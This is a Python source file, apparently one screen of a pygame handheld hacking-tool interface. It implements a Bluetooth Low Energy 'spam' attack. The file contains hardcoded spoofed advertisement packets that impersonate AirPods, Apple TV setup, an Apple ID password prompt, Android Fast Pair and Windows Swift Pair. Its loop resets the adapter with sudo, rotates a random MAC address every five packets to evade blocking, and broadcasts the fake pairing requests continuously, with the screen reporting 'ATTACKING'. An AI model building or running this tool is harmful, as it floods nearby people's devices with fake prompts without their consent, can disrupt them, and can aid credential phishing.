"""BLE Spam screen — Aggressive Apple/Android/Windows pairing spoofing."""
from __future__ import annotations

import os
import subprocess
import threading
import time
import random

import pygame

from . import Screen
from .. import config

# BLE Advertisement Packets (AppleJuice, Fast Pair, Swift Pair)
PROFILES = [
    ("AirPods Pro", b"\x02\x01\x06\x1a\xff\x4c\x00\x07\x19\x07\x02\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12"),
    ("AirPods Max", b"\x02\x01\x06\x1a\xff\x4c\x00\x07\x19\x07\x02\x20\x75\xaa\x30\x01\x00\x00\x4a\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12"),
    ("Powerbeats Pro", b"\x02\x01\x06\x1a\xff\x4c\x00\x07\x19\x07\x02\x20\x75\xaa\x30\x01\x00\x00\x4b\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12"),
    ("Apple TV Setup", b"\x02\x01\x06\x1a\xff\x4c\x00\x07\x19\x07\x02\x20\x75\xaa\x30\x01\x00\x00\x44\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12"),
    ("Apple ID Password", b"\x02\x01\x06\x1a\xff\x4c\x00\x07\x19\x07\x02\x20\x75\xaa\x30\x01\x00\x00\x53\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12"),
    ("Android Fast Pair", b"\x02\x01\x06\x03\x03\x2d\xfe\x06\x16\x2d\xfe\x00\x00\x00\x00\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12"),
    ("Windows Swift Pair", b"\x02\x01\x06\x03\x03\x00\xfe\x16\x16\x00\xfe\x00\x00\x00\x00\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12"),
    ("Chaos (All)", b"ALL"),
]

class BLESpamScreen(Screen):
    def __init__(self, app):
        super().__init__(app)
        self.running = False
        self.cursor = 0
        self.error_msg = ""
        self.packets_sent = 0
        self.iface = self._get_best_iface()
        
        self._stop_event = threading.Event()
        self._spam_thread = None

    def _get_best_iface(self) -> str:
        try:
            out = subprocess.check_output(["hciconfig"]).decode()
            if "hci1" in out: return "hci1"
        except: pass
        return "hci0"

    def on_action(self, action: str):
        if action == "B":
            self._stop()
            self.app.pop()
        elif action == "UP" and not self.running:
            self.cursor = (self.cursor - 1) % len(PROFILES)
        elif action == "DOWN" and not self.running:
            self.cursor = (self.cursor + 1) % len(PROFILES)
        elif action == "A":
            if self.running:
                self._stop()
            else:
                self._start()

    def _start(self):
        self.running = True
        self.error_msg = ""
        self.packets_sent = 0
        self._stop_event.clear()
        self._spam_thread = threading.Thread(target=self._spam_loop, daemon=True)
        self._spam_thread.start()

    def _stop(self):
        self._stop_event.set()
        if self._spam_thread:
            self._spam_thread.join(timeout=1.0)
        self.running = False

    def _spam_loop(self):
        try:
            # 1. HARD RESET the controller
            subprocess.run(["sudo", "hciconfig", self.iface, "reset"], capture_output=True)
            time.sleep(0.5)
            
            # 2. Enable LE and Advertising
            subprocess.run(["sudo", "btmgmt", "-i", self.iface, "le", "on"], capture_output=True)
            subprocess.run(["sudo", "btmgmt", "-i", self.iface, "advertising", "on"], capture_output=True)
            subprocess.run(["sudo", "hciconfig", self.iface, "up"], capture_output=True)

            while not self._stop_event.is_set():
                # Randomize MAC EVERY 5 packets
                if self.packets_sent % 5 == 0:
                    subprocess.run(["sudo", "hcitool", "-i", self.iface, "cmd", "0x08", "0x000a", "00"], capture_output=True)
                    mac = [random.randint(0, 255) for _ in range(6)]
                    mac[0] |= 0xC0 # LE random address
                    mac_str = " ".join(f"{b:02x}" for b in mac)
                    subprocess.run(["sudo", "hcitool", "-i", self.iface, "cmd", "0x08", "0x0005"] + mac_str.split(), capture_output=True)
                    subprocess.run(["sudo", "hcitool", "-i", self.iface, "cmd", "0x08", "0x000a", "01"], capture_output=True)

                # Select data
                _, profile_data = PROFILES[self.cursor]
                if profile_data == b"ALL":
                    actual_profiles = [p for p in PROFILES if p[1] != b"ALL"]
                    profile_data = random.choice(actual_profiles)[1]

                hex_data = " ".join(f"{b:02x}" for b in profile_data)
                pad_count = 31 - len(profile_data)
                if pad_count > 0:
                    hex_data += " " + " ".join(["00"] * pad_count)
                
                cmd = ["sudo", "hcitool", "-i", self.iface, "cmd", "0x08", "0x0008", "1e"] + hex_data.split()
                subprocess.run(cmd, capture_output=True)
                
                # Start
                subprocess.run(["sudo", "hcitool", "-i", self.iface, "cmd", "0x08", "0x000a", "01"], capture_output=True)
                
                self.packets_sent += 1
                time.sleep(0.1)

            subprocess.run(["sudo", "hcitool", "-i", self.iface, "cmd", "0x08", "0x000a", "00"], capture_output=True)

        except Exception as e:
            self.error_msg = str(e)
            self.running = False

    def update(self, dt: float):
        pass

    def is_animating(self):
        return self.running

    def draw(self, surf, theme):
        self.app.draw_wallpaper(surf, theme)
        self.app.statusbar.draw(surf, theme, "BT: BLE ATTACK")

        font = theme.font("ui")
        small = theme.font("small")
        accent = theme.color("accent")
        
        # Status box
        status_rect = pygame.Rect(10, 40, config.SCREEN_W - 20, 60)
        pygame.draw.rect(surf, theme.color("tile"), status_rect, border_radius=8)
        pygame.draw.rect(surf, accent, status_rect, width=1, border_radius=8)
        
        status_text = f"ATTACKING: {self.packets_sent} pkts" if self.running else "STATUS: READY"
        col = theme.color("danger") if self.running else theme.color("text")
        surf.blit(font.render(status_text, True, col), (status_rect.x + 15, status_rect.y + 10))
        surf.blit(small.render(f"INTERFACE: {self.iface}", True, theme.color("text_dim")), 
                  (status_rect.x + 15, status_rect.y + 35))

        if self.error_msg:
            surf.blit(small.render(f"ERR: {self.error_msg[:40]}", True, theme.color("danger")), (10, 105))

        # Profile List
        list_y = 120
        for i, (name, _) in enumerate(PROFILES):
            y = list_y + i * 22
            sel = (i == self.cursor)
            if sel and not self.running:
                pygame.draw.rect(surf, theme.color("tile_sel"), (10, y-2, 200, 20), border_radius=4)
            
            p_color = accent if sel else theme.color("text_dim")
            mark = "> " if sel else "  "
            surf.blit(small.render(f"{mark}{name}", True, p_color), (15, y))

    def hints(self):
        act = "stop" if self.running else "start"
        return [("B", "back"), ("A", act), ("↑↓", "profile")]
